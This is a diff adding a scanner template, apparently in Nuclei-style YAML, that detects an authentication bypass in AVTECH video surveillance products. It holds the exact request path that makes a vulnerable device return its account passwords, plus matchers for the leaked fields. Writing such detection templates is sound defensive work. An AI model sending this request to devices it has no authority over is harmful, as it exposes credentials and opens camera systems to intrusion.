@@ -1,0 +1,34 @@
+id: "avtech-auth-bypass"
+name: "AVTECH Video Surveillance Product - Authentication Bypass"
+severity: "high"
+description: "AVTECH Video Surveillance Products password disclosure through /cgi-bin/user/Config.cgi."
+tech:
+  - "generic"
+tags:
+  - "exposure"
+  - "avtech"
+  - "auth-bypass"
+  - "password"
+  - "vuln"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "Account.Maxuser="
+      - "Account.LocalPassword="
+    condition: "and"
+  - type: "word"
+    part: "header"
+    words:
+      - "text/plain"
+  - type: "status"
+    status:
+      - 200
